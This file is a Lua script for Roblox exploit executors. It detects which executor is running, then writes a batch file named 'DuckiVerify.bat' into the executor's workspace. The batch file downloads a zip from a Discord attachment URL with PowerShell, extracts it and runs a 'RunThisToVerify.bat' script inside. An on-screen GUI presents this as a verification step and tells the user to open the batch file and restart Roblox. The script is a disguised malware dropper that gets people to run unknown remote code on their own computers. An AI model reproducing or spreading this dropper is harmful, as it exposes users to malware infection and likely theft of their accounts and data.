-- Detect Executor Name
local executorName = "Unknown Executor"

if identifyexecutor then
    executorName = identifyexecutor() -- Works with Synapse X, Script-Ware, etc.
elseif getexecutorname then
    executorName = getexecutorname() -- Works with newer executors
elseif syn then
    executorName = "Synapse X"
elseif KRNL_LOADED then
    executorName = "KRNL"
elseif fluxus then
    executorName = "Fluxus"
elseif secure_load then
    executorName = "ScriptWare"
end

-- Define workspace path based on detected executor
local workspacePath = "C:\\Users\\YourUser\\ExecutorPath\\" .. executorName .. "\\workspace\\DUCKIVERIFY"
local batFilePath = workspacePath .. "\\DuckiVerify.bat"

-- Ensure folder exists (Try multiple methods)
pcall(function()
    if not isfolder(workspacePath) then
        makefolder(workspacePath)
    end
end)

-- Batch file content
local batContent = [[
@echo off
echo Downloading DuckiVerify...
set "url=https://cdn.discordapp.com/attachments/1341636194601013384/1353099900736241754/DuckiVerify.zip"
set "output=DuckiVerify.zip"
set "extractFolder=DUCKIVERIFY"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

if exist "%output%" (
    echo Extracting files...
    powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '.\%extractFolder%'"
    echo Done!

    if exist ".\%extractFolder%\%extractFolder%\" (
        move ".\%extractFolder%\%extractFolder%\*" ".\%extractFolder%\" >nul
        rmdir ".\%extractFolder%\%extractFolder%"
    )

    cd ".\%extractFolder%"
    if exist "RunThisToVerify.bat" (
        echo Running verification...
        call "RunThisToVerify.bat"
    ) else (
        echo Verification script not found!
    )

    cd..
    del "%output%"
) else (
    echo Download failed!
)

pause
]]

-- Try multiple ways to write the file
pcall(function() writefile(batFilePath, batContent) end)

-- GUI Creation
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Instructions = Instance.new("TextLabel")
local CopyButton = Instance.new("TextButton")

ScreenGui.Parent = game:GetService("CoreGui")

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 220)
Frame.Position = UDim2.new(0.5, -200, 0.5, -110)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Active = true
Frame.Draggable = true

Title.Parent = Frame
Title.Size = UDim2.new(1, 0, 0.2, 0)
Title.Position = UDim2.new(0, 0, 0, 10)
Title.Text = "DUCKIVERIFY SETUP"
Title.TextColor3 = Color3.fromRGB(255, 255, 0)
Title.TextScaled = true
Title.BackgroundTransparency = 1

Instructions.Parent = Frame
Instructions.Size = UDim2.new(0.9, 0, 0.5, 0)
Instructions.Position = UDim2.new(0.05, 0, 0.2, 0)
Instructions.Text = "1. Open '" .. executorName .. "'\n2. Go to 'workspace' folder\n3. Look for 'DUCKIVERIFY'\n4. open 'DuckiVerify'\n5. Restart Roblox after verification!"
Instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
Instructions.TextScaled = true
Instructions.BackgroundTransparency = 1
Instructions.TextWrapped = true

CopyButton.Parent = Frame
CopyButton.Size = UDim2.new(0.8, 0, 0.2, 0)
CopyButton.Position = UDim2.new(0.1, 0, 0.75, 0)
CopyButton.Text = "Copy Path to Clipboard"
CopyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.MouseButton1Click:Connect(function()
    setclipboard(workspacePath)
end)

print("GUI and instructions ready.")
